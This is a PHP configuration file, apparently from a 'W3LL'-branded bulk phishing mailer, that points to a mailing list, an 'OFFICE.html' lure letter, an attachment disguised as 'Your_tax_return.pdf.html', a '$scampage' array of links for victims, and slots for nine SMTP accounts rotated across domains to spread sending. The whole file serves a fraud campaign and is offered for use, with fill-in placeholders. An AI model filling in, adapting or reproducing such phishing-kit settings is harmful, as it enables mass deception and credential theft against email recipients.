<?php

//Main config, this didnt change when gettin update

$mail_list = "file/W3LL_MAILLIST/W3LL_MAIL.txt";
$msg_file = "file/W3LL_LETTER/OFFICE.html";
$attachment = "file/attachment/Your_tax_return.pdf.html";
$scampage = [

	// IF YOU WANT USE MULTI LINK YOU CAN USE DIFFRENT LINK BELLOW IF YOU JUST HV 1 LINK U SHOULD PUT THAT 1 LINK 5 TIMES

"https://google.com/", //link 1
"https://google.com/", //link 2
"https://google.com/", //link 3
"https://google.com/", //link 4
"https://google.com/", //link 5

];

/* W3LL SMTP SETUP */

// FILL ALL WITH SMTP

$smtp_acc = [


// FOR USE MULTI SMTP YOU SHOULD PUT 10 DIFFRENT SMTP DOWN BELOW (WITH DIFFRENT DOMAIN OF SMTP)

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

["host" => "PUT YOUR SMTP SERVER HERE","port" => "587","username" => "PUT YOUR SMTP USER HERE","password" => "PUT YOUR SMTP PASSWORD HERE"],

];


/* END */ 

?>